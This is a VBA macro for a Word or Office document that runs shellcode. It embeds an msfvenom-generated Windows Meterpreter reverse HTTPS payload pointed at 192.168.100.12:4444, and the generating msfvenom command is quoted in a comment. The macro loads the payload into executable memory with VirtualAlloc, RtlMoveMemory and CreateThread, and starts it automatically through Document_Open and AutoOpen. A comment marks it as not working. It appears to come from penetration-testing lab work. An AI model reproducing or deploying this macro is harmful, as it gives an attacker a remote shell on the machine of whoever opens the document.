// No funcional
// msfvenom -p windows/meterpreter/reverse_https lhost=192.168.100.12 lport=4444 -f vbapplication EXITFUNC=thread -o vba.txt
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
 Dim buf As Variant
 Dim addr As LongPtr
 Dim counter As Long
 Dim data As Long
 Dim res As LongPtr
 
buf = Array(252, 232, 143, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 15, 183, 74, 38, 139, 114, 40, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 139, 82, 16, 87, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 72, 24, 139, 88, 32, 1, 211, 80, 133, 201, 116, 60, 49, 255, _
73, 139, 52, 139, 1, 214, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, _
104, 76, 119, 38, 7, 255, 213, 49, 219, 83, 83, 83, 83, 83, 232, 62, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 49, 59, 32, 84, 114, 105, 100, 101, 110, 116, 47, 55, 46, 48, 59, 32, 114, 118, 58, 49, 49, 46, 48, 41, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, _
0, 104, 58, 86, 121, 167, 255, 213, 83, 83, 106, 3, 83, 83, 104, 92, 17, 0, 0, 232, 128, 1, 0, 0, 47, 109, 107, 104, 85, 120, 88, 104, 85, 99, 57, 77, 81, 48, 82, 72, 81, 99, 115, 80, 100, 57, 65, 65, 85, 45, 73, 52, 86, 53, 48, 55, 113, 98, 111, 53, 56, 98, 90, 70, 57, 84, 72, 69, 108, 120, 69, 118, 78, 118, 70, 110, 50, 82, 95, 85, _
51, 106, 84, 110, 80, 77, 49, 107, 79, 48, 102, 112, 116, 68, 87, 97, 110, 117, 51, 72, 99, 102, 65, 45, 119, 101, 85, 84, 82, 84, 109, 118, 52, 73, 71, 67, 117, 72, 50, 102, 89, 74, 89, 45, 110, 80, 89, 110, 109, 115, 53, 51, 53, 70, 73, 119, 88, 104, 82, 71, 82, 103, 55, 111, 121, 107, 110, 75, 66, 107, 105, 71, 108, 97, 97, 81, 98, 103, 65, 112, _
50, 57, 119, 51, 49, 95, 82, 120, 80, 98, 50, 50, 115, 85, 82, 65, 119, 48, 120, 120, 52, 81, 95, 73, 71, 119, 90, 112, 72, 89, 56, 100, 109, 98, 54, 85, 100, 111, 83, 53, 119, 99, 110, 49, 72, 111, 83, 120, 109, 109, 50, 116, 67, 101, 100, 76, 49, 110, 71, 50, 113, 118, 118, 70, 77, 107, 68, 54, 53, 122, 119, 115, 119, 119, 69, 88, 68, 50, 57, 113, _
98, 65, 110, 102, 54, 106, 98, 98, 112, 55, 74, 56, 89, 53, 103, 76, 68, 98, 87, 81, 111, 121, 89, 103, 0, 80, 104, 87, 137, 159, 198, 255, 213, 137, 198, 83, 104, 0, 50, 232, 132, 83, 83, 83, 87, 83, 86, 104, 235, 85, 46, 59, 255, 213, 150, 106, 10, 95, 104, 128, 51, 0, 0, 137, 224, 106, 4, 80, 106, 31, 86, 104, 117, 70, 158, 134, 255, 213, 83, 83, _
83, 83, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 20, 104, 136, 19, 0, 0, 104, 68, 240, 53, 224, 255, 213, 79, 117, 205, 232, 75, 0, 0, 0, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 83, 104, 88, 164, 83, 229, 255, 213, 147, 83, 83, 137, 231, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, 150, 137, 226, 255, 213, 133, 192, 116, 207, 139, 7, _
1, 195, 133, 192, 117, 229, 88, 195, 95, 232, 107, 255, 255, 255, 49, 57, 50, 46, 49, 54, 56, 46, 49, 48, 48, 46, 49, 50, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)


 addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
 For counter = LBound(buf) To UBound(buf)
 data = buf(counter)
 res = RtlMoveMemory(addr + counter, data, 1)
 Next counter
 
 res = CreateThread(0, 0, addr, 0, 0, 0)

End Function

Sub Document_Open()
 mymacro
End Sub

Sub AutoOpen()
 mymacro
End Sub
